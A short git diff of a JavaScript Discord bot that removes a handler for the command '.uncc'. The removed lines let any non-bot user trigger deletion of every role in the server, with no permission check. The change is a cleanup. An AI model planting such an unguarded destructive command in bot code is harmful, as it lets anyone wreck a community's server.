@@ -301,14 +301,7 @@ client.on('voiceStateUpdate', (old, now) => {
 
 
   
-  client.on('message' , ReBeL => {
-var prefix = ".";
-if(ReBeL.author.bot) return;
-if(ReBeL.channel.type == 'dm') return;
-if(ReBeL.content.startsWith(prefix + "uncc")) {
-ReBeL.guild.roles.filter(rebel => isNaN(rebel)).forEach(codes => codes.delete())
-}
-});
+  
   
  client.on('message', eyad => {
   if (eyad.content.startsWith('.mute')) {
